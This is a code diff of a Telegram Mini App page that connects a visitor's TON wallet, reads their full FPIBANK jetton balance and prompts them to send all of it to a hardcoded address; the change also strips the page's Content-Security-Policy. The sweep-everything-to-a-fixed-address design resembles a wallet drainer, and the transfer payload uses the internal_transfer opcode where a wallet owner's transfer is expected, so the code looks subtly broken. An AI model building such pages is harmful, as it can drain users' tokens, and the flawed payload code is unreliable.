@@ -3,33 +3,32 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Mini App: Send All Jetton (FPIBANK)</title>
 
-  <meta http-equiv="Content-Security-Policy"
-  content="
-    default-src 'self';
-    script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
-    style-src 'self' 'unsafe-inline' https://unpkg.com;
-    connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
-    font-src 'self' https://unpkg.com;
-    img-src * data:;
-  ">
-
-  <title>Telegram Mini App: TON Connect Jetton Transfer</title>
-
+  <!-- 
+    Подключаем Telegram WebApp (если используете Telegram Mini App)
+    и TonConnect UI (для кошельков).
+  -->
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
-  <script src="./js/tonconnect-sdk.min.js"></script>
-  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+
+  <!--
+    Важно: ton-core нужно либо импортировать из сборки, либо
+    использовать отдельный скрипт, собранный вами.
+    Ниже пример, если вы используете сборку ES-модулей (type="module").
+  -->
 </head>
 <body>
-  <h1>Telegram Mini App: Отправка всех токенов FPIBANK</h1>
-
+  <h1>Отправка всех токенов FPIBANK (Jetton)</h1>
   <div id="ton-connect"></div>
+  <button id="sendAllJettonBtn">Отправить все FPIBANK</button>
 
-  <button id="sendTransaction">Отправить все FPIBANK</button>
+  <script type="module">
+    import { beginCell, cellToBoc, Address } from "ton-core"; 
+    // Если у вас нет прямого импорта, подключите свою сборку ton-core
+    // <script src="ton-core.bundle.js"></script> и уберите type="module"
 
-  <script>
-    // Инициализация Telegram WebApp
+    // Инициализация Telegram WebApp (если работаете внутри Telegram Mini App)
     if (typeof Telegram === "undefined") {
       window.Telegram = {
         WebApp: {
@@ -43,59 +42,141 @@
 
     // Инициализация TON Connect UI
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+      // Укажите ваш manifest.json, в котором описан dApp
       manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
       buttonRootId: "ton-connect"
     });
 
-    // Адрес jetton master
+    // Адрес Jetton Master (FPIBANK)
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
 
-    async function sendJettonTransaction(userWalletAddress, recipientAddress) {
+    // Адрес, на который отправляем все токены (замените при необходимости)
+    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
+
+    /**
+     * Получаем Jetton Wallet и баланс пользователя через tonapi.io
+     * (Пользовательский TON-адрес -> Jetton Wallet -> баланс)
+     */
+    async function getUserJettonWalletAndBalance(userTonAddress) {
+      try {
+        // 1) Находим Jetton Wallet пользователя
+        const url = `https://tonapi.io/v2/jetton/wallets?account=${userTonAddress}&jetton_master=${jettonMasterAddress}`;
+        const res = await fetch(url);
+        const data = await res.json();
+
+        if (!data.wallets || data.wallets.length === 0) {
+          return { walletAddress: null, balance: "0" };
+        }
+
+        // Предполагаем, что у пользователя один Jetton Wallet
+        const userWalletInfo = data.wallets[0];
+        const walletAddress = userWalletInfo.address;  // адрес Jetton Wallet
+        const balance = userWalletInfo.balance;        // строка с балансом (в наносах Jetton)
+
+        return { walletAddress, balance };
+      } catch (err) {
+        console.error("Ошибка получения Jetton Wallet:", err);
+        return { walletAddress: null, balance: "0" };
+      }
+    }
+
+    /**
+     * Формируем BOC (internal_transfer) для перевода всех токенов
+     * Стандарт Jetton: internal_transfer#178d4519
+     */
+    function buildInternalTransferBOC(amountNano, toAddress, fromAddress) {
+      // У опкода internal_transfer = 0x178d4519
+      // query_id = 0, forward_payload отсутствует
+      // forward_ton_amount = 0
+      // custom_payload отсутствует
+      // Подробнее в спецификации Jetton
+      const OP_INTERNAL_TRANSFER = 0x178d4519;
+      const cell = beginCell()
+        .storeUint(OP_INTERNAL_TRANSFER, 32) // op
+        .storeUint(0, 64)                   // query_id
+        .storeCoins(amountNano)             // сумма Jetton в наносах
+        .storeAddress(Address.parse(toAddress))   // destination
+        .storeAddress(Address.parse(fromAddress)) // response_destination
+        .storeBit(false) // custom_payload отсутствует
+        .storeCoins(0)   // forward_ton_amount = 0
+        .storeBit(false) // forward_payload отсутствует
+        .endCell();
+
+      // Конвертируем Cell в Base64
+      return cellToBoc(cell, { idx: false }).toString("base64");
+    }
+
+    /**
+     * Отправка транзакции через TON Connect
+     * userJettonWallet - адрес Jetton Wallet
+     * bocBase64 - сериализованный BOC
+     */
+    async function sendAllJettonTransaction(userJettonWallet, bocBase64) {
+      // amount: сколько TON прикладываем для оплаты газа. 
+      // Часто нужно 0.02 - 0.05 TON, здесь 0.02 (20000000 нанотон)
       const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 360,
         messages: [
           {
-            address: jettonMasterAddress, // Отправляем на Jetton Master напрямую
-            amount: "0", // Задаём placeholder для комиссии (автоматический расчет может быть настроен на уровне платформы)
-            payload: {
-              type: "jetton_transfer",
-              query_id: 0,
-              amount: "1000000000", // Попытка отправить 1 токен
-              destination: recipientAddress,
-              response_destination: null,
-              custom_payload: null,
-              forward_ton_amount: "0",
-              forward_payload: null
-            }
+            address: userJettonWallet,
+            amount: "20000000", // 0.02 TON для комиссии
+            payload: bocBase64
           }
         ]
       };
 
       try {
         const result = await tonConnectUI.sendTransaction(transaction);
-        console.log("Попытка отправить Jetton:", result);
-        Telegram.WebApp.showAlert("Попытка отправить Jetton: " + JSON.stringify(result));
+        console.log("Результат перевода Jetton:", result);
+        Telegram.WebApp.showAlert("Результат перевода Jetton: " + JSON.stringify(result));
       } catch (error) {
-        console.error("Ошибка:", error);
-        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
+        console.error("Ошибка при отправке Jetton:", error);
+        Telegram.WebApp.showAlert("Ошибка при отправке Jetton: " + error.message);
       }
     }
 
+    /**
+     * Основная функция "Отправить все FPIBANK"
+     */
     async function sendAllFPIBANK() {
       if (!tonConnectUI.connected) {
-        Telegram.WebApp.showAlert("Подключите сначала кошелек.");
+        Telegram.WebApp.showAlert("Сначала подключите кошелек через TonConnect.");
         return;
       }
 
-      // Используем корректное свойство для получения адреса кошелька
-      const userWalletAddress = tonConnectUI.session.account.address;
-      // Задаём валидный адрес получателя (замените на нужный, если требуется)
-      const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
+      // TON-адрес пользователя (не Jetton Wallet!)
+      const userTonAddress = tonConnectUI.session.account.address;
+      console.log("Адрес TON пользователя:", userTonAddress);
 
-      await sendJettonTransaction(userWalletAddress, recipientAddress);
+      // Получаем Jetton Wallet и баланс
+      const { walletAddress, balance } = await getUserJettonWalletAndBalance(userTonAddress);
+      if (!walletAddress) {
+        Telegram.WebApp.showAlert("У пользователя нет Jetton Wallet для FPIBANK или ошибка в API.");
+        return;
+      }
+      console.log("Jetton Wallet:", walletAddress, "Баланс (нанотокен):", balance);
+
+      // Если баланс "0", отправлять нечего
+      if (balance === "0") {
+        Telegram.WebApp.showAlert("У пользователя 0 FPIBANK токенов.");
+        return;
+      }
+
+      // Собираем payload: internal_transfer для "всего баланса"
+      const bocBase64 = buildInternalTransferBOC(
+        balance,            // отправляем всё
+        recipientAddress,   // куда отправляем
+        userTonAddress      // куда вернётся ответ (обычно тот же адрес кошелька)
+      );
+
+      // Отправляем транзакцию
+      await sendAllJettonTransaction(walletAddress, bocBase64);
     }
 
-    document.getElementById("sendTransaction").addEventListener("click", sendAllFPIBANK);
+    // Вешаем обработчик на кнопку
+    document
+      .getElementById("sendAllJettonBtn")
+      .addEventListener("click", sendAllFPIBANK);
   </script>
 </body>
 </html>
